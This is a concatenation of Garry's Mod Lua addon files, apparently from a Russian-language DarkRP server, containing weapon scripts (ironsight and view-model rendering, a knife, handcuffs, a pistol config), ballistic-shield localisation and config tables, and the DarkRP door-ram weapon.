    if not owner:IsNPC() and selfTbl.ResetSights and CurTime() >= selfTbl.ResetSights then
        selfTbl.ResetSights = nil
        if selfTbl.Silenced then
            self:SendWeaponAnim(ACT_VM_IDLE_SILENCED)
        else
            self:SendWeaponAnim(ACT_VM_IDLE)
        end
    end

    local pressingE = owner:KeyDown(IN_USE)
    local pressingM2 = owner:KeyDown(IN_ATTACK2)
    if selfTbl.CanBeSilenced and selfTbl.NextSilence < CurTime() then if pressingE and pressingM2 then self:Silencer() end end
    if selfTbl.SelectiveFire and selfTbl.NextFireSelect < CurTime() and not self:GetNWBool("Reloading") then if pressingE and owner:KeyPressed(IN_RELOAD) then self:SelectFireMode() end end
    local donateUpgrade = owner:GetNW2Bool("donate_upgrade_runngun")
    if owner:KeyPressed(IN_SPEED) and not donateUpgrade and not self:GetNWBool("Reloading") then
        if self:GetNextPrimaryFire() <= (CurTime() + 0.3) then self:SetNextPrimaryFire(CurTime() + 0.3) end
        selfTbl.IronSightsPos = selfTbl.RunSightsPos
        selfTbl.IronSightsAng = selfTbl.RunSightsAng
        self:SetIronsights(true, owner)
        owner:SetFOV(0, 0.3)
        selfTbl.DrawCrosshair = false
    end

    if owner:KeyReleased(IN_SPEED) and not donateUpgrade then
        self:SetIronsights(false, owner)
        owner:SetFOV(0, 0.3)
        selfTbl.DrawCrosshair = selfTbl.OrigCrossHair
    end

    if not pressingE and (not owner:KeyDown(IN_SPEED) or donateUpgrade) and owner:KeyPressed(IN_ATTACK2) and not self:GetNWBool("Reloading") then
        owner:SetFOV(selfTbl.Secondary.IronFOV, 0.3)
        selfTbl.IronSightsPos = selfTbl.SightsPos
        selfTbl.IronSightsAng = selfTbl.SightsAng
        self:SetIronsights(true, owner)
        selfTbl.DrawCrosshair = false
        if CLIENT then return end
    end

    if owner:KeyReleased(IN_ATTACK2) and not pressingE and (not owner:KeyDown(IN_SPEED) or donateUpgrade) then
        owner:SetFOV(0, 0.3)
        selfTbl.DrawCrosshair = selfTbl.OrigCrossHair
        self:SetIronsights(false, owner)
        if CLIENT then return end
    end

    if pressingM2 and not pressingE and (not owner:KeyDown(IN_SPEED) or donateUpgrade) then
        selfTbl.SwayScale = 0.05
        selfTbl.BobScale = 0.05
    else
        selfTbl.SwayScale = 1.0
        selfTbl.BobScale = 1.0
    end
end 
 
/*---------------------------------------------------------
Think
-----------------------------------------------------*/
function SWEP:Think()
 
self:IronSight()
 
end
 
/*---------------------------------------------------------
GetViewModelPosition
-----------------------------------------------------*/
local IRONSIGHT_TIME = 0.3
-- //Time to enter in the ironsight mod
 
function SWEP:GetViewModelPosition(pos, ang)
 
		if (not self.IronSightsPos) then return pos, ang end
 
		local bIron = self.Weapon:GetNWBool("M9K_Ironsights")
 
		if (bIron != self.bLastIron) then
				self.bLastIron = bIron
				self.fIronTime = CurTime()
 
		end
 
		local fIronTime = self.fIronTime or 0
 
		if (not bIron and fIronTime < CurTime() - IRONSIGHT_TIME) then
				return pos, ang
		end
 
		local Mul = 1.0
 
		if (fIronTime > CurTime() - IRONSIGHT_TIME) then
				Mul = math.Clamp((CurTime() - fIronTime) / IRONSIGHT_TIME, 0, 1)
 
				if not bIron then Mul = 1 - Mul end
		end
 
		local Offset    = self.IronSightsPos
 
		if (self.IronSightsAng) then
				ang = ang * 1
				ang:RotateAroundAxis(ang:Right(),               self.IronSightsAng.x * Mul)
				ang:RotateAroundAxis(ang:Up(),          self.IronSightsAng.y * Mul)
				ang:RotateAroundAxis(ang:Forward(),     self.IronSightsAng.z * Mul)
		end
 
		local Right     = ang:Right()
		local Up                = ang:Up()
		local Forward   = ang:Forward()
 
		pos = pos + Offset.x * Right * Mul
		pos = pos + Offset.y * Forward * Mul
		pos = pos + Offset.z * Up * Mul
 
		return pos, ang
end
 
/*---------------------------------------------------------
SetIronsights
-----------------------------------------------------*/
function SWEP:SetIronsights(b)
		self.Weapon:SetNWBool("M9K_Ironsights", b)
end
 
function SWEP:GetIronsights()
		return self.Weapon:GetNWBool("M9K_Ironsights")
end
 
 
if CLIENT then
 
		SWEP.vRenderOrder = nil
		function SWEP:ViewModelDrawn()
			   
				if not IsValid(self) then return end 
				if not IsValid(self.Owner) then return end
				local vm = self.Owner:GetViewModel()
				if !IsValid(vm) then return end
			   
				if (!self.VElements) then return end
			   
				self:UpdateBonePositions(vm)
 
				if (!self.vRenderOrder) then
					   
						-- // we build a render order because sprites need to be drawn after models
						self.vRenderOrder = {}
 
						for k, v in pairs( self.VElements ) do
								if (v.type == "Model") then
										table.insert(self.vRenderOrder, 1, k)
								elseif (v.type == "Sprite" or v.type == "Quad") then
										table.insert(self.vRenderOrder, k)
								end
						end
					   
				end
 
				for k, name in ipairs( self.vRenderOrder ) do
			   
						local v = self.VElements[name]
						if (!v) then self.vRenderOrder = nil break end
						if (v.hide) then continue end
					   
						local model = v.modelEnt
						local sprite = v.spriteMaterial
					   
						if (!v.bone) then continue end
					   
						local pos, ang = self:GetBoneOrientation( self.VElements, v, vm )
					   
						if (!pos) then continue end
					   
						if (v.type == "Model" and IsValid(model)) then
 
								model:SetPos(pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z )
								ang:RotateAroundAxis(ang:Up(), v.angle.y)
								ang:RotateAroundAxis(ang:Right(), v.angle.p)
								ang:RotateAroundAxis(ang:Forward(), v.angle.r)
 
								model:SetAngles(ang)
								-- //model:SetModelScale(v.size)
								local matrix = Matrix()
								matrix:Scale(v.size)
								model:EnableMatrix( "RenderMultiply", matrix )
							   
								if (v.material == "") then
										model:SetMaterial("")
								elseif (model:GetMaterial() != v.material) then
										model:SetMaterial( v.material )
								end
							   
								if (v.skin and v.skin != model:GetSkin()) then
										model:SetSkin(v.skin)
								end
							   
								if (v.bodygroup) then
										for k, v in pairs( v.bodygroup ) do
												if (model:GetBodygroup(k) != v) then
														model:SetBodygroup(k, v)
												end
										end
								end
							   
								if (v.surpresslightning) then
										render.SuppressEngineLighting(true)
								end
							   
								render.SetColorModulation(v.color.r/255, v.color.g/255, v.color.b/255)
								render.SetBlend(v.color.a/255)
								model:DrawModel()
								render.SetBlend(1)
								render.SetColorModulation(1, 1, 1)
							   
								if (v.surpresslightning) then
										render.SuppressEngineLighting(false)
								end
							   
						elseif (v.type == "Sprite" and sprite) then
							   
								local drawpos = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
								render.SetMaterial(sprite)
								render.DrawSprite(drawpos, v.size.x, v.size.y, v.color)
							   
						elseif (v.type == "Quad" and v.draw_func) then
							   
								local drawpos = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
								ang:RotateAroundAxis(ang:Up(), v.angle.y)
								ang:RotateAroundAxis(ang:Right(), v.angle.p)
								ang:RotateAroundAxis(ang:Forward(), v.angle.r)
							   
								cam.Start3D2D(drawpos, ang, v.size)
										v.draw_func( self )
								cam.End3D2D()
 
						end
					   
				end
			   
		end
 
		SWEP.wRenderOrder = nil
		function SWEP:DrawWorldModel()
			   
				if (self.ShowWorldModel == nil or self.ShowWorldModel) then
						self:DrawModel()
				end
			   
				if (!self.WElements) then return end
			   
				if (!self.wRenderOrder) then
 
						self.wRenderOrder = {}
 
						for k, v in pairs( self.WElements ) do
								if (v.type == "Model") then
										table.insert(self.wRenderOrder, 1, k)
								elseif (v.type == "Sprite" or v.type == "Quad") then
										table.insert(self.wRenderOrder, k)
								end
						end
 
				end
			   
				if (IsValid(self.Owner)) then
						bone_ent = self.Owner
				else
						-- // when the weapon is dropped
						bone_ent = self
				end
			   
				for k, name in pairs( self.wRenderOrder ) do
			   
						local v = self.WElements[name]
						if (!v) then self.wRenderOrder = nil break end
						if (v.hide) then continue end
					   
						local pos, ang
					   
						if (v.bone) then
								pos, ang = self:GetBoneOrientation( self.WElements, v, bone_ent )
						else
								pos, ang = self:GetBoneOrientation( self.WElements, v, bone_ent, "ValveBiped.Bip01_R_Hand" )
						end
					   
						if (!pos) then continue end
					   
						local model = v.modelEnt
						local sprite = v.spriteMaterial
					   
						if (v.type == "Model" and IsValid(model)) then
 
								model:SetPos(pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z )
								ang:RotateAroundAxis(ang:Up(), v.angle.y)
								ang:RotateAroundAxis(ang:Right(), v.angle.p)
								ang:RotateAroundAxis(ang:Forward(), v.angle.r)
 
								model:SetAngles(ang)
								-- //model:SetModelScale(v.size)
								local matrix = Matrix()
								matrix:Scale(v.size)
								model:EnableMatrix( "RenderMultiply", matrix )
							   
								if (v.material == "") then
										model:SetMaterial("")
								elseif (model:GetMaterial() != v.material) then
										model:SetMaterial( v.material )
								end
							   
								if (v.skin and v.skin != model:GetSkin()) then
										model:SetSkin(v.skin)
								end
							   
								if (v.bodygroup) then
										for k, v in pairs( v.bodygroup ) do
												if (model:GetBodygroup(k) != v) then
														model:SetBodygroup(k, v)
												end
										end
								end
							   
								if (v.surpresslightning) then
										render.SuppressEngineLighting(true)
								end
							   
								render.SetColorModulation(v.color.r/255, v.color.g/255, v.color.b/255)
								render.SetBlend(v.color.a/255)
								model:DrawModel()
								render.SetBlend(1)
								render.SetColorModulation(1, 1, 1)
							   
								if (v.surpresslightning) then
										render.SuppressEngineLighting(false)
								end
							   
						elseif (v.type == "Sprite" and sprite) then
							   
								local drawpos = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
								render.SetMaterial(sprite)
								render.DrawSprite(drawpos, v.size.x, v.size.y, v.color)
							   
						elseif (v.type == "Quad" and v.draw_func) then
							   
								local drawpos = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
								ang:RotateAroundAxis(ang:Up(), v.angle.y)
								ang:RotateAroundAxis(ang:Right(), v.angle.p)
								ang:RotateAroundAxis(ang:Forward(), v.angle.r)
							   
								cam.Start3D2D(drawpos, ang, v.size)
										v.draw_func( self )
								cam.End3D2D()
 
						end
					   
				end
			   
		end
 
		function SWEP:GetBoneOrientation( basetab, tab, ent, bone_override )
			   
				local bone, pos, ang
				if (tab.rel and tab.rel != "") then
					   
						local v = basetab[tab.rel]
					   
						if (!v) then return end
					   
						-- // Technically, if there exists an element with the same name as a bone
						-- // you can get in an infinite loop. Let's just hope nobody's that stupid.
						pos, ang = self:GetBoneOrientation( basetab, v, ent )
					   
						if (!pos) then return end
					   
						pos = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
						ang:RotateAroundAxis(ang:Up(), v.angle.y)
						ang:RotateAroundAxis(ang:Right(), v.angle.p)
						ang:RotateAroundAxis(ang:Forward(), v.angle.r)
							   
				else
			   
						bone = ent:LookupBone(bone_override or tab.bone)
 
						if (!bone) then return end
					   
						pos, ang = Vector(0,0,0), Angle(0,0,0)
						local m = ent:GetBoneMatrix(bone)
						if (m) then
								pos, ang = m:GetTranslation(), m:GetAngles()
						end
					   
						if (IsValid(self.Owner) and self.Owner:IsPlayer() and
								ent == self.Owner:GetViewModel() and self.ViewModelFlip) then
								ang.r = -ang.r --// Fixes mirrored models
						end
			   
				end
			   
				return pos, ang
		end
 
		function SWEP:CreateModels( tab )
 
				if (!tab) then return end
 
				-- // Create the clientside models here because Garry says we can't do it in the render hook
				for k, v in pairs( tab ) do
						if (v.type == "Model" and v.model and v.model != "" and (!IsValid(v.modelEnt) or v.createdModel != v.model) and
										string.find(v.model, ".mdl") and file.Exists (v.model, "GAME") ) then
							   
								v.modelEnt = ClientsideModel(v.model, RENDER_GROUP_VIEW_MODEL_OPAQUE)
								if (IsValid(v.modelEnt)) then
										v.modelEnt:SetPos(self:GetPos())
										v.modelEnt:SetAngles(self:GetAngles())
										v.modelEnt:SetParent(self)
										v.modelEnt:SetNoDraw(true)
										v.createdModel = v.model
								else
										v.modelEnt = nil
								end
							   
						elseif (v.type == "Sprite" and v.sprite and v.sprite != "" and (!v.spriteMaterial or v.createdSprite != v.sprite)
								and file.Exists ("materials/"..v.sprite..".vmt", "GAME")) then
							   
								local name = v.sprite.."-"
								local params = { ["$basetexture"] = v.sprite }
								-- // make sure we create a unique name based on the selected options
								local tocheck = { "nocull", "additive", "vertexalpha", "vertexcolor", "ignorez" }
								for i, j in pairs( tocheck ) do
										if (v[j]) then
												params["$"..j] = 1
												name = name.."1"
										else
												name = name.."0"
										end
								end
 
								v.createdSprite = v.sprite
								v.spriteMaterial = CreateMaterial(name,"UnlitGeneric",params)
							   
						end
				end
			   
		end
	   
		local allbones
		local hasGarryFixedBoneScalingYet = false
 
		function SWEP:UpdateBonePositions(vm)
			   
				if self.ViewModelBoneMods then
					   
						if (!vm:GetBoneCount()) then return end
					   
						-- // !! WORKAROUND !! --//
						-- // We need to check all model names :/
						local loopthrough = self.ViewModelBoneMods
						if (!hasGarryFixedBoneScalingYet) then
								allbones = {}
								for i=0, vm:GetBoneCount() do
										local bonename = vm:GetBoneName(i)
										if (self.ViewModelBoneMods[bonename]) then
												allbones[bonename] = self.ViewModelBoneMods[bonename]
										else
												allbones[bonename] = {
														scale = Vector(1,1,1),
														pos = Vector(0,0,0),
														angle = Angle(0,0,0)
												}
										end
								end
							   
								loopthrough = allbones
						end
						//!! ----------- !! --
					   
						for k, v in pairs( loopthrough ) do
								local bone = vm:LookupBone(k)
								if (!bone) then continue end
							   
								-- // !! WORKAROUND !! --//
								local s = Vector(v.scale.x,v.scale.y,v.scale.z)
								local p = Vector(v.pos.x,v.pos.y,v.pos.z)
								local ms = Vector(1,1,1)
								if (!hasGarryFixedBoneScalingYet) then
										local cur = vm:GetBoneParent(bone)
										while(cur >= 0) do
												local pscale = loopthrough[vm:GetBoneName(cur)].scale
												ms = ms * pscale
												cur = vm:GetBoneParent(cur)
										end
								end
							   
								s = s * ms
								//!! ----------- !! --
							   
								if vm:GetManipulateBoneScale(bone) != s then
										vm:ManipulateBoneScale( bone, s )
								end
								if vm:GetManipulateBoneAngles(bone) != v.angle then
										vm:ManipulateBoneAngles( bone, v.angle )
								end
								if vm:GetManipulateBonePosition(bone) != p then
										vm:ManipulateBonePosition( bone, p )
								end
						end
				else
						self:ResetBonePositions(vm)
				end
				   
		end
		 
		function SWEP:ResetBonePositions(vm)
			   
				if (!vm:GetBoneCount()) then return end
				for i=0, vm:GetBoneCount() do
						vm:ManipulateBoneScale( i, Vector(1, 1, 1) )
						vm:ManipulateBoneAngles( i, Angle(0, 0, 0) )
						vm:ManipulateBonePosition( i, Vector(0, 0, 0) )
				end
			   
		end
 
		/**************************
				Global utility code
		**************************/
 
		-- // Fully copies the table, meaning all tables inside this table are copied too and so on (normal table.Copy copies only their reference).
		-- // Does not copy entities of course, only copies their reference.
		-- // WARNING: do not use on tables that contain themselves somewhere down the line or you'll get an infinite loop
		function table.FullCopy( tab )
 
				if (!tab) then return nil end
			   
				local res = {}
				for k, v in pairs( tab ) do
						if (type(v) == "table") then
								res[k] = table.FullCopy(v) --// recursion ho!
						elseif (type(v) == "Vector") then
								res[k] = Vector(v.x, v.y, v.z)
						elseif (type(v) == "Angle") then
								res[k] = Angle(v.p, v.y, v.r)
						else
								res[k] = v
						end
				end
			   
				return res
			   
		end
	   
end


--PATH addons/grp_knife/lua/weapons/csgo_flip_fade.lua:
if not file.Exists( "weapons/csgo_baseknife.lua", "LUA" ) then
  SWEP.Spawnable = false
  print( "csgo_flip_fade failed to initialize: csgo_baseknife.lua not found. Did you install the main part?" )
  return
end

local TTT = ( GAMEMODE_NAME == "terrortown" or cvars.Bool("csgo_knives_force_ttt", false) )

DEFINE_BASECLASS( "csgo_baseknife" )

if ( SERVER ) then
  SWEP.Weight         = 5
  SWEP.AutoSwitchTo   = false
  SWEP.AutoSwitchFrom = false

  if TTT then
    SWEP.EquipMenuData = nil
  end
end

if ( CLIENT ) then
  SWEP.Slot         = TTT and 6 or 2
  SWEP.SlotPos      = 0
end

SWEP.PrintName      = "Flip Knife" .. " | " .. "Fade"
SWEP.Category       = "CS:GO Knives"

SWEP.Spawnable      = true
SWEP.AdminSpawnable = true

SWEP.ViewModel      = "models/weapons/v_csgo_flip.mdl"
SWEP.WorldModel     = "models/weapons/w_csgo_flip.mdl"

SWEP.SkinIndex      = 6
SWEP.PaintMaterial  = nil
SWEP.AreDaggers     = false

util.PrecacheModel( SWEP.ViewModel )
util.PrecacheModel( SWEP.WorldModel )

-- TTT config values

-- Kind specifies the category this weapon is in. Players can only carry one of
-- each. Can be: WEAPON_... MELEE, PISTOL, HEAVY, NADE, CARRY, EQUIP1, EQUIP2 or ROLE.
-- Matching SWEP.Slot values: 0      1       2     3      4      6       7        8
SWEP.Kind = WEAPON_EQUIP

-- If AutoSpawnable is true and SWEP.Kind is not WEAPON_EQUIP1/2, then this gun can
-- be spawned as a random weapon.
SWEP.AutoSpawnable = false

-- The AmmoEnt is the ammo entity that can be picked up when carrying this gun.
-- SWEP.AmmoEnt = "item_ammo_smg1_ttt"

-- CanBuy is a table of ROLE_* entries like ROLE_TRAITOR and ROLE_DETECTIVE. If
-- a role is in this table, those players can buy this.
SWEP.CanBuy = nil

-- InLoadoutFor is a table of ROLE_* entries that specifies which roles should
-- receive this weapon as soon as the round starts. In this case, none.
SWEP.InLoadoutFor = nil

-- If LimitedStock is true, you can only buy one per round.
SWEP.LimitedStock = false

-- If AllowDrop is false, players can't manually drop the gun with Q
SWEP.AllowDrop = true

-- If IsSilent is true, victims will not scream upon death.
SWEP.IsSilent = true

-- If NoSights is true, the weapon won't have ironsights
SWEP.NoSights = true

-- This sets the icon shown for the weapon in the DNA sampler, search window,
-- equipment menu (if buyable), etc.
SWEP.Icon = "vgui/entities/csgo_flip_fade.vmt"

--PATH addons/cuffs/lua/weapons/cuff.lua:
-------------------------------------
---------------- Cuffs --------------
-------------------------------------
-- Copyright (c) 2015 Nathan Healy --
-------- All rights reserved --------
-------------------------------------
-- weapon_cuff_police.lua   SHARED --
--                                 --
-- Strong police handcuffs.        --
-------------------------------------

AddCSLuaFile()

SWEP.Base = "weapon_cuff_base"

SWEP.Category = "GambitRP"
SWEP.Author = "my_hat_stinks"
SWEP.Instructions = "Sturdy police-issue handcuffs."

SWEP.Spawnable = true
SWEP.AdminOnly = true
SWEP.AdminSpawnable = true

SWEP.Slot = 3
SWEP.PrintName = "Наручники"

//
// Handcuff Vars
SWEP.CuffTime = 0.1 //Seconds to handcuff
SWEP.CuffSound = Sound( "buttons/lever7.wav" )

SWEP.CuffMaterial = "phoenix_storms/gear"
SWEP.CuffRope = "cable/cable2"
SWEP.CuffStrength = 1.5
SWEP.CuffRegen = 1
SWEP.RopeLength = 0
SWEP.CuffReusable = true

SWEP.CuffBlindfold = false
SWEP.CuffGag = false

SWEP.CuffStrengthVariance = 0.1 // Randomise strangth
SWEP.CuffRegenVariance = 0.1 // Randomise regen

SWEP.CuffsCanArrest = true // Players in this restraint can be arrested. Has no effect if restrict arrest is disabled.
SWEP.CuffsCanAutoArrest = false // This swep can be used to auto-arrest. Has no effect if auto arrest is disabled.

--PATH addons/weaponandcontent/lua/weapons/deagle/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = true
	SWEP.PrintName = "Desert Eagle"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos = Vector(3.023, 0, 0.945)
	SWEP.AimAng = Vector(1.036, -0.057, 0)
	
	SWEP.SprintPos = Vector(-2.345, -8.233, -5.493)
	SWEP.SprintAng = Vector(70, 0, 0)
	
	SWEP.ZoomAmount = 5
	SWEP.ViewModelMovementScale = 0.85
	SWEP.Shell = "smallshell"
	
	SWEP.IconLetter = "f"
	--killicon.AddFont("swb_deagle", "SWB_KillIcons", SWEP.IconLetter, Color(255, 80, 0, 150))
	
	SWEP.MuzzleEffect = "swb_pistol_large"
	SWEP.MuzzlePosMod = {x = 6.5, y = 30, z = -2}
	SWEP.PosBasedMuz = true
end
SWEP.CanPenetrate = false
SWEP.PlayBackRate = 30
SWEP.PlayBackRateSV = 12
SWEP.SpeedDec = 10
SWEP.BulletDiameter = 11.5
SWEP.CaseLength = 22.8

SWEP.Kind = WEAPON_PISTOL
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true
SWEP.AmmoEnt = "item_ammo_revolver_ttt"

SWEP.Slot = 1
SWEP.SlotPos = 0
SWEP.NormalHoldType = "pistol"
SWEP.RunHoldType = "normal"
SWEP.FireModes = {"semi"}
SWEP.Base = "swb_base"
SWEP.Category = "Weapons"

SWEP.Author			= "Base swb"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 70
SWEP.ViewModelFlip	= true
SWEP.ViewModel				= "models/weapons/2_pist_deagle.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_pist_deagle.mdl"	-- Weapon world model
SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 7
SWEP.Primary.DefaultClip	= 7
SWEP.Primary.Automatic		= false
SWEP.Primary.Ammo			= "pistol"

SWEP.FireDelay = 0.3
SWEP.FireSound = Sound("Weapon_DEagle.Single")
SWEP.Recoil = 1
SWEP.DryFire = true

SWEP.HipSpread = 0.045
SWEP.AimSpread = 0.009
SWEP.VelocitySensitivity = 0
SWEP.MaxSpreadInc = 0
SWEP.SpreadPerShot = 0
SWEP.SpreadCooldown = 0
SWEP.Shots = 1
SWEP.Damage = 25
SWEP.DeployTime = 1
--PATH addons/cp_ballistic_shields/lua/ballistic_shields/sh_bs_lang.lua:
include( "ballistic_shields/sh_bs_util.lua" )

bshields.lang = {
	["English"] = {
		["sec"] = "[ПКМ] Видимость",
		["dshieldprim"] = "[ЛКМ] Применить",
		["hshieldprim"] = "[ЛКМ] Сломать дверь",
		["rshieldprim"] = "[ЛКМ] Атака",
		["hshieldcd1"] = "Подождите ",
		["hshieldcd2"] = " секунд что-бы сломать дверь!"	
	},
	["German"] = {
		["sec"] = "[RMB] SICHTBARKEIT",
		["dshieldprim"] = "[LMB] PLAZIEREN",
		["hshieldprim"] = "[LMB] TÜR AUFBRECHEN",
		["rshieldprim"] = "[LMB] ANGREIFEN",
		["hshieldcd1"] = "Warte ",
		["hshieldcd2"] = " Sekunden für das Aufbrechen der nächsten Tür!"	
	},
	["French"] = {
		["sec"] = "[RMB] VISIBILITÉ",
		["dshieldprim"] = "[LMB] DÉPLOYER",
		["hshieldprim"] = "[LMB] FORCER LA PORTE",
		["rshieldprim"] = "[LMB] ATTAQUER",
		["hshieldcd1"] = "Attendez ",
		["hshieldcd2"] = " secondes pour forcer la porte !"	
	},
	["Danish"] = {
		["sec"] = "[RMB] SIGTBARHED",
		["dshieldprim"] = "[LMB] SÆT",
		["hshieldprim"] = "[LMB] BREACH DØR",
		["rshieldprim"] = "[LMB] ANGRIB",
		["hshieldcd1"] = "Vent ",
		["hshieldcd2"] = " sekunder at bryde ved siden af!"   
	},
	["Turkish"] = {
		["sec"] = "[RMB] GORUNURLUK",
		["dshieldprim"] = "[LMB] YERLESTIR",
		["hshieldprim"] = "[LMB] BREACH DOOR",
		["rshieldprim"] = "[LMB] SALDIR",
		["hshieldcd1"] = "Bekle ",
		["hshieldcd2"] = " bir sonraki kapıyı kırmaya saniye kaldı!"   
	}
}  

if(bshields.lang[bshields.config.language]==nil) then bshields.config.language = "English" end
--PATH addons/cp_ballistic_shields/lua/ballistic_shields/sh_bs_util.lua:
bshields = bshields or {}
bshields.config = bshields.config or {}

bshields.shields = {
	{
		[1] = {
			["angles"] = Angle(4,6,-14),
			["position"] = Vector(0,8,-1)
		},
		[2] = {
			["angles"] = Angle(6,6,-12),
			["position"] = Vector(8,10,-4)
		},
		[3] = {
			["angles"] = Angle(-3,7,-16),
			["position"] = Vector(-1,4,-3)
		}
	},
	{
		[1] = {
			["angles"] = Angle(-12,0,0),
			["position"] = Vector(6,-4,-8)
		},
		[2] = {
			["angles"] = Angle(-12,0,0),
			["position"] = Vector(16,-3,-12)
		},
		[3] = {
			["angles"] = Angle(-12,0,0),
			["position"] = Vector(6,-3,-12)
		}
	},
	{
		[1] = {
			["angles"] = Angle(70,78,-16),
			["position"] = Vector(1,-7,-13)
		},
		[2] = {
			["angles"] = Angle(70,78,-16),
			["position"] = Vector(1,-6,-22)
		},
		[3] = {
			["angles"] = Angle(70,78,-16),
			["position"] = Vector(1,-8,-12)
		}
	}
}

--PATH gamemodes/darkrp/entities/weapons/door_ram/shared.lua:
AddCSLuaFile()

if CLIENT then
    SWEP.PrintName = "Вышибала"
    SWEP.Slot = 5
    SWEP.SlotPos = 1
    SWEP.DrawAmmo = false
    SWEP.DrawCrosshair = false
end

-- Variables that are used on both client and server
DEFINE_BASECLASS("weapon_cs_base2")

SWEP.Author = "DarkRP Developers"
SWEP.Instructions = "Left click to break open doors/unfreeze props or get people out of their vehicles\nRight click to raise"
SWEP.Contact = ""
SWEP.Purpose = ""
SWEP.IsDarkRPDoorRam = true

SWEP.IconLetter = ""

SWEP.ViewModelFOV = 62
SWEP.ViewModelFlip = false
SWEP.ViewModel = Model("models/weapons/c_rpg.mdl")
SWEP.WorldModel = Model("models/weapons/w_rocket_launcher.mdl")
SWEP.AnimPrefix = "rpg"

SWEP.UseHands = true

SWEP.Spawnable = true
SWEP.AdminOnly = false
SWEP.Category = "DarkRP (Utility)"

SWEP.Sound = Sound("physics/wood/wood_box_impact_hard3.wav")

SWEP.Primary.ClipSize = -1      -- Size of a clip
SWEP.Primary.DefaultClip = 0        -- Default number of bullets in a clip
SWEP.Primary.Automatic = false      -- Automatic/Semi Auto
SWEP.Primary.Ammo = ""

SWEP.Secondary.ClipSize = -1        -- Size of a clip
SWEP.Secondary.DefaultClip = 0     -- Default number of bullets in a clip
SWEP.Secondary.Automatic = false     -- Automatic/Semi Auto
SWEP.Secondary.Ammo = ""

--[[---------------------------------------------------------
Name: SWEP:Initialize()
Desc: Called when the weapon is first loaded
---------------------------------------------------------]]
function SWEP:Initialize()
    if CLIENT then self.LastIron = CurTime() end
    self:SetHoldType("normal")
end

function SWEP:Holster()
    self.dt.Ironsights = false

    return true
end

-- Check whether an object of this player can be rammed
local function canRam(ply)
    return IsValid(ply) and (ply.warranted == true or ply:isWanted() or ply:isArrested())
end

-- Ram action when ramming a door
local function ramDoor(ply, trace, ent)
    if ply:EyePos():Distance(trace.HitPos) > 45 or (not GAMEMODE.Config.canforcedooropen and ent:getKeysNonOwnable()) then return false end

    local allowed = false

    -- if we need a warrant to get in
    if GAMEMODE.Config.doorwarrants and ent:isKeysOwned() and not ent:isKeysOwnedBy(ply) then
        -- if anyone who owns this door has a warrant for their arrest
        -- allow the police to smash the door in
        for k, v in player.Iterator() do
            if ent:isKeysOwnedBy(v) and canRam(v) then
                allowed = true
                break
            end
        end
    else
        -- door warrants not needed, allow warrantless entry
        allowed = true
    end

    -- Be able to open the door if any member of the door group is warranted
    if GAMEMODE.Config.doorwarrants and ent:getKeysDoorGroup() and RPExtraTeamDoors[ent:getKeysDoorGroup()] then
        allowed = false
        for k,v in player.Iterator() do
            if table.HasValue(RPExtraTeamDoors[ent:getKeysDoorGroup()], v:Team()) and canRam(v) then
                allowed = true
                break
            end
        end
    end

    if CLIENT then return allowed end

    -- Do we have a warrant for this player?
    if not allowed then
        DarkRP.notify(ply, 1, 5, DarkRP.getPhrase("warrant_required"))

        return false
    end

    ent:keysUnLock()
    -- ent:Fire("open", "", .6)
    -- ent:Fire("setanimation", "open", .6)
	timer.Simple( 0.6, function() ent:Use(ply, ply, USE_ON, 1) end )
    return true
end

-- Ram action when ramming a vehicle
local function ramVehicle(ply, trace, ent)
    if ply:EyePos():Distance(trace.HitPos) > 100 then return false end

    if CLIENT then return false end -- Ideally this would return true after ent:GetDriver() check

    local driver = ent:GetDriver()
    if not IsValid(driver) or not driver.ExitVehicle then return false end

    driver:ExitVehicle()
    ent:keysLock()

    return true
end

-- Ram action when ramming a fading door
local function ramFadingDoor(ply, trace, ent)
    if ply:EyePos():Distance(trace.HitPos) > 100 then return false end

    local Owner = ent:CPPIGetOwner()

    if CLIENT then return canRam(Owner) end

    if not canRam(Owner) then
        DarkRP.notify(ply, 1, 5, DarkRP.getPhrase("warrant_required"))
        return false
    end

    if  ent:GetNWBool("fadingfix") then
        ent:Fade()
    end

    return true
end

-- Ram action when ramming a frozen prop
local function ramProp(ply, trace, ent)
    if 1 then return false end
    if ply:EyePos():Distance(trace.HitPos) > 100 then return false end
    if ent:GetClass() ~= "prop_physics" then return false end

    local Owner = ent:CPPIGetOwner()

    if CLIENT then return canRam(Owner) end

    if not canRam(Owner) then
        DarkRP.notify(ply, 1, 5, DarkRP.getPhrase(GAMEMODE.Config.copscanunweld and "warrant_required_unweld" or "warrant_required_unfreeze"))
        return false
    end

    if GAMEMODE.Config.copscanunweld then
        constraint.RemoveConstraints(ent, "Weld")
    end

    if GAMEMODE.Config.copscanunfreeze then
        ent:GetPhysicsObject():EnableMotion(true)
    end
    
    ent:Remove()
    
    return true
end

-- Decides the behaviour of the ram function for the given entity
local function getRamFunction(ply, trace)
    local ent = trace.Entity

    if not IsValid(ent) then return fp{fn.Id, false} end

    local override = hook.Call("canDoorRam", nil, ply, trace, ent)

    return
        override ~= nil     and fp{fn.Id, override}                                 or
        ent:isDoor()        and fp{ramDoor, ply, trace, ent}                        or
        ent:IsVehicle()     and fp{ramVehicle, ply, trace, ent}                     or
        ent:GetNWBool("fadingfix")    and fp{ramFadingDoor, ply, trace, ent}                  or
        ent:GetPhysicsObject():IsValid() and not ent:GetPhysicsObject():IsMoveable()
                                         and fp{ramProp, ply, trace, ent}           or
        fp{fn.Id, false} -- no ramming was performed
end

--[[---------------------------------------------------------
Name: SWEP:PrimaryAttack()
Desc: +attack1 has been pressed
---------------------------------------------------------]]
